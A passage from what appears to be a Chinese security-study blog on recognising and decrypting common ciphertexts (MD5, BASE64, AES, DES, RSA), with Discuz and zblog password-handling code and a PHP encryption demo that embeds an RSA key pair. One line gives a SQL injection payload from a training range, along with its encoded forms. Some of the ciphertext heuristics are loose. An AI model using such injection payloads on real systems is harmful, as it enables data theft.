32位<br>解密需求：密文即可，但复杂明文可能解不出</p></blockquote><p>BASE64编码特点：</p><blockquote><p>0、大小写区分，通过数字和字母的组合<br>1、一般情况下密文尾部都会有两个等号，明文很少的时候则没有<br>2、明文越长密文越长，一般不会出现&quot;/&quot;&quot;+&quot;在密文中</p></blockquote><p>AES、DES密文特点：</p><blockquote><p>同BASE64基本类似，但一般会出现&quot;/&quot;和&quot;+&quot;在密文中<br>解密需求：密文，模式，加密Key，偏移量，条件满足才可解出</p></blockquote><p>RSA密文特点：</p><blockquote><p>特征同AES,DES相似，但是长度较长<br>解密需求：密文，公钥或私钥即可解出<br>密文长度比较固定</p></blockquote><p>其他密文特点见：<br>1.<a href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&mid=2247484455&idx=1&sn=e1b4324ddcf7d6123be30d9a5613e17b&chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&mpshare=1&scene=23&srcid=1111auAYWmr1N0NAs9Wp2hGz&sharer_sharetime=1605145141579&sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">30余种加密编码类型的密文特征分析</a>（建议收藏）</p><p>2.<a href="https://blog.csdn.net/qq_41638851/article/details/100526839">CTF中常见密码题解密网站总结</a>（建议收藏）</p><p>3.<a href="https://blog.csdn.net/qq_40837276/article/details/83080460">CTF密码学常见加密解密总结</a>（建议收藏）</p><h2 id="解密实例-密文存储-amp-数据传输"><a href="#解密实例-密文存储-amp-数据传输" class="headerlink" title="解密实例-密文存储&amp;数据传输"></a>解密实例-密文存储&amp;数据传输</h2><p>1、密码存储（后端处理）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">X3.<span class="number">2</span>-md5&amp;salt</span><br><span class="line">DZ对应代码段-/uc_server/model/user.php</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="variable">$salt</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="variable">$h</span> = <span class="string">&#x27;d7192407bb4bfc83d28f374b6812fbcd&#x27;</span>;</span><br><span class="line"><span class="variable">$hash</span>=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;123456&#x27;</span>).<span class="string">&#x27;3946d5&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$h</span>==<span class="variable">$hash</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>X3.5-hash</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">DZ对应代码段-/uc_server/model/user.php</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$salt</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$password</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">generate_password</span>(<span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">generate_password</span>(<span class="params"><span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$algo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_passwordalgo</span>();</span><br><span class="line">  <span class="variable">$options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_passwordoptions</span>();</span><br><span class="line">  <span class="variable">$hash</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, <span class="variable">$algo</span>, <span class="variable">$options</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">// 加密的密文</span><br><span class="line"><span class="variable">$hash</span> = <span class="string">&#x27;$2y$10$KA.7VYVheqod8F3X65tWjO3ZXfozNA2fC4oIZoDSu/TbfgKmiw7xO&#x27;</span>;</span><br><span class="line">// password_verify：加密密码，再和密文进行碰撞。</span><br><span class="line"><span class="keyword">if</span> (password_verify(<span class="string">&#x27;123456&#x27;</span>, <span class="variable">$hash</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>2、 <strong>数据通讯</strong><br>博客登录-zblog（前端处理）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;script/md5.js&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">$(<span class="string">&quot;#btnPost&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> strPassWord=$(<span class="string">&quot;#edtPassWord&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">    $(<span class="string">&quot;form&quot;</span>).<span class="title function_">attr</span>(<span class="string">&quot;action&quot;</span>,<span class="string">&quot;cmd.php?act=verify&quot;</span>);</span><br><span class="line">    $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>(<span class="title class_">MD5</span>(strPassWord));</span><br></pre></td></tr></table></figure><p>-墨者靶场-（后端处理）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-1 union select 1,database(),user(),4_mozhe</span><br><span class="line">xgd58ipTrnx8VzSBJicqCibZxIRsZKgXOYUrNQP8fCCtx9JZ+6K1hHt7RKkzV305</span><br><span class="line">eGdkNThpcFRybng4VnpTQkppY3FDaWJaeElSc1pLZ1hPWVVyTlFQOGZDQ3R4OUpaKzZLMWhIdDdSS2t6VjMwNQ==</span><br></pre></td></tr></table></figure><p>PHP7.3加密演示代码块</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//aes</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">vendor</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EncryptionTool</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">enAES</span>(<span class="params"><span class="variable">$originTxt</span>, <span class="variable">$key</span></span>): <span class="title">string</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$originTxt</span>, <span class="string">&#x27;AES-128-ECB&#x27;</span>,<span class="variable">$key</span>, OPENSSL_RAW_DATA));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">deAES</span>(<span class="params"><span class="variable">$originTxt</span>, <span class="variable">$key</span></span>): <span class="title">string</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$originTxt</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$data</span>,<span class="string">&#x27;AES-128-ECB&#x27;</span>,<span class="variable">$key</span>, OPENSSL_RAW_DATA);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//des</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DES</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string $method 加解密方法，可通过 openssl_get_cipher_methods() 获得</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string $key 加解密的密钥</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string $output 输出格式 无、base64、hex</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string $iv 加解密的向量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$iv</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string $options</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">    <span class="comment">// output 的类型</span></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OUTPUT_NULL</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OUTPUT_BASE64</span> = <span class="string">&#x27;base64&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OUTPUT_HEX</span> = <span class="string">&#x27;hex&#x27;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * DES constructor.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $method</span></span><br><span class="line"><span class="comment">     *      ECB DES-ECB、DES-EDE3 （为 ECB 模式时，$iv 为空即可）</span></span><br><span class="line"><span class="comment">     *      CBC DES-CBC、DES-EDE3-CBC、DESX-CBC</span></span><br><span class="line"><span class="comment">     *      CFB DES-CFB8、DES-EDE3-CFB8</span></span><br><span class="line"><span class="comment">     *      CTR</span></span><br><span class="line"><span class="comment">     *      OFB</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $output</span></span><br><span class="line"><span class="comment">     *      base64、hex</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $iv</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int $options</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$method</span> = <span class="string">&#x27;DES-ECB&#x27;</span>, <span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$iv</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$options</span> = OPENSSL_RAW_DATA | OPENSSL_NO_PADDING</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;output = <span class="variable">$output</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;iv = <span class="variable">$iv</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options = <span class="variable">$options</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加密</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $str</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">pkcsPadding</span>(<span class="variable">$str</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$str</span>, <span class="variable">$this</span>-&gt;method, <span class="variable">$this</span>-&gt;key, <span class="variable">$this</span>-&gt;options, <span class="variable">$this</span>-&gt;iv);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;output == <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_BASE64</span>) &#123;</span><br><span class="line">            <span class="variable">$sign</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$sign</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;output == <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_HEX</span>) &#123;</span><br><span class="line">            <span class="variable">$sign</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$sign</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解密</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $encrypted</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$encrypted</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;output == <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_BASE64</span>) &#123;</span><br><span class="line">            <span class="variable">$encrypted</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$encrypted</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;output == <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_HEX</span>) &#123;</span><br><span class="line">            <span class="variable">$encrypted</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$encrypted</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sign</span> = @<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encrypted</span>, <span class="variable">$this</span>-&gt;method, <span class="variable">$this</span>-&gt;key, <span class="variable">$this</span>-&gt;options, <span class="variable">$this</span>-&gt;iv);</span><br><span class="line">        <span class="variable">$sign</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">unPkcsPadding</span>(<span class="variable">$sign</span>);</span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">rtrim</span>(<span class="variable">$sign</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 填充</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $str</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $blocksize</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">pkcsPadding</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$blocksize</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$pad</span> = <span class="variable">$blocksize</span> - (<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) % <span class="variable">$blocksize</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span> . <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$pad</span>), <span class="variable">$pad</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 去填充</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $str</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">unPkcsPadding</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$pad</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>&#123;<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>) - <span class="number">1</span>&#125;);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pad</span> &gt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, -<span class="number">1</span> * <span class="variable">$pad</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//rsa</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;RSA_PUBLIC&#x27;</span>, <span class="string">&#x27;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmkANmC849IOntYQQdSgLvMMGm</span></span><br><span class="line"><span class="string">8V/u838ATHaoZwvweoYyd+/7Wx+bx5bdktJb46YbqS1vz3VRdXsyJIWhpNcmtKhY</span></span><br><span class="line"><span class="string">inwcl83aLtzJeKsznppqMyAIseaKIeAm6tT8uttNkr2zOymL/PbMpByTQeEFlyy1</span></span><br><span class="line"><span class="string">poLBwrol0F4USc+owwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;RSA_PRIVATE&#x27;</span>,<span class="string">&#x27;-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAKaQA2YLzj0g6e1h</span></span><br><span class="line"><span class="string">BB1KAu8wwabxX+7zfwBMdqhnC/B6hjJ37/tbH5vHlt2S0lvjphupLW/PdVF1ezIk</span></span><br><span class="line"><span class="string">haGk1ya0qFiKfByXzdou3Ml4qzOemmozIAix5ooh4Cbq1Py6202SvbM7KYv89syk</span></span><br><span class="line"><span class="string">HJNB4QWXLLWmgsHCuiXQXhRJz6jDAgMBAAECgYAIF5cSriAm+CJlVgFNKvtZg5Tk</span></span><br><span class="line"><span class="string">93UhttLEwPJC3D7IQCuk6A7Qt2yhtOCvgyKVNEotrdp3RCz++CY0GXIkmE2bj7i0</span></span><br><span class="line"><span class="string">fv5vT3kWvO9nImGhTBH6QlFDxc9+p3ukwsonnCshkSV9gmH5NB/yFoH1m8tck2Gm</span></span><br><span class="line"><span class="string">BXDj+bBGUoKGWtQ7gQJBANR/jd5ZKf6unLsgpFUS/kNBgUa+EhVg2tfr9OMioWDv</span></span><br><span class="line"><span class="string">MSqzG/sARQ2AbO00ytpkbAKxxKkObPYsn47MWsf5970CQQDIqRiGmCY5QDAaejW4</span></span><br><span class="line"><span class="string">HbOcsSovoxTqu1scGc3Qd6GYvLHujKDoubZdXCVOYQUMEnCD5j7kdNxPbVzdzXll</span></span><br><span class="line"><span class="string">9+p/AkEAu/34iXwCbgEWQWp4V5dNAD0kXGxs3SLpmNpztLn/YR1bNvZry5wKew5h</span></span><br><span class="line"><span class="string">z1zEFX+AGsYgQJu1g/goVJGvwnj/VQJAOe6f9xPsTTEb8jkAU2S323BG1rQFsPNg</span></span><br><span class="line"><span class="string">jY9hnWM8k2U/FbkiJ66eWPvmhWd7Vo3oUBxkYf7fMEtJuXu+JdNarwJAAwJK0YmO</span></span><br><span class="line"><span class="string">LxP4U+gTrj7y/j/feArDqBukSngcDFnAKu1hsc68FJ/vT5iOC6S7YpRJkp8egj5o</span></span><br><span class="line"><span class="string">pCcWaTO3GgC5Kg==</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&#x27;xiaodisec&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//md5</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始数据:<span class="subst">$password</span>&quot;</span>. <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;MD5加密后:&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>). <span class="string">&quot;&lt;hr/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//base64</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始数据:<span class="subst">$password</span>&quot;</span>. <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;BASE64编码后:&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$password</span>). <span class="string">&quot;&lt;hr/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//aes</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始数据: &quot;</span> . <span class="variable">$password</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title class_">EncryptionTool</span>::<span class="title function_ invoke__">enAES</span>(<span class="variable">$password</span>, <span class="string">&quot;1234567891234567&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;AES加密后: &quot;</span> . <span class="variable">$data</span> . <span class="string">&quot;&lt;hr/&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo &quot;解密后: &quot; . EncryptionTool::deAES($data, &quot;1234567891234567&quot;) . &quot;&lt;br/&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//des</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始数据:<span class="subst">$password</span>&quot;</span>. <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;key123456&#x27;</span>;</span><br><span class="line"><span class="variable">$iv</span> = <span class="string">&#x27;iv123456&#x27;</span>;</span><br><span class="line"><span class="comment">// DES CBC 加解密</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;DES CBC 加解密:&#x27;</span>;</span><br><span class="line"><span class="variable">$des</span> = <span class="keyword">new</span> <span class="title function_ invoke__">DES</span>(<span class="variable">$key</span>, <span class="string">&#x27;DES-CBC&#x27;</span>, DES::<span class="variable constant_">OUTPUT_BASE64</span>, <span class="variable">$iv</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$base64Sign</span> = <span class="variable">$des</span>-&gt;<span class="title function_ invoke__">encrypt</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo $des-&gt;decrypt($base64Sign);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// DES ECB 加解密</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始数据:<span class="subst">$password</span>&quot;</span>. <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;DES ECB 加解密:&#x27;</span>;</span><br><span class="line"><span class="variable">$des</span> = <span class="keyword">new</span> <span class="title function_ invoke__">DES</span>(<span class="variable">$key</span>, <span class="string">&#x27;DES-ECB&#x27;</span>, DES::<span class="variable constant_">OUTPUT_BASE64</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$base64Sign</span> = <span class="variable">$des</span>-&gt;<span class="title function_ invoke__">encrypt</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//echo $des-&gt;decrypt($base64Sign);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//rsa</span></span><br><span class="line"><span class="comment">//公钥加密 </span></span><br><span class="line"><span class="variable">$public_key</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(RSA_PUBLIC); </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$public_key</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;公钥不可用&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第一个参数是待加密的数据只能是string，第二个参数是加密后的数据,第三个参数是openssl_pkey_get_public返回的资源类型,第四个参数是填充方式</span></span><br><span class="line"><span class="variable">$return_en</span> = <span class="title function_ invoke__">openssl_public_encrypt</span>(<span class="variable">$password</span>, <span class="variable">$crypted</span>, <span class="variable">$public_key</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$return_en</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="string">&#x27;加密失败,请检查RSA秘钥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$eb64_cry</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$crypted</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RSA公钥加密数据：&quot;</span>.<span class="variable">$eb64_cry</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//私钥解密</span></span><br><span class="line"><span class="variable">$private_key</span> = <span class="title function_ invoke__">openssl_pkey_get_private</span>(RSA_PRIVATE);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$private_key</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;私钥不可用&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$return_de</span> = <span class="title function_ invoke__">openssl_private_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$eb64_cry</span>), <span class="variable">$decrypted</span>, <span class="variable">$private_key</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$return_de</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="string">&#x27;解密失败,请检查RSA秘钥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RSA私钥解密数据:&quot;</span>.<span class="variable">$decrypted</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//私钥加密</span></span><br><span class="line"><span class="variable">$private_key</span> = <span class="title function_ invoke__">openssl_pkey_get_private</span>(RSA_PRIVATE);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$private_key</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;私钥不可用&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$return_en</span> = <span class="title function_ invoke__">openssl_private_encrypt</span>(<span class="variable">$password</span>, <span class="variable">$crypted</span>, <span class="variable">$private_key</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$return_en</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="string">&#x27;加密失败,请检查RSA秘钥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$eb64_cry</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$crypted</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RSA私钥加密数据&quot;</span>.<span class="variable">$eb64_cry</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公钥解密</span></span><br><span class="line"><span class="variable">$public_key</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(RSA_PUBLIC);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$public_key</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;公钥不可用&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$return_de</span> = <span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span 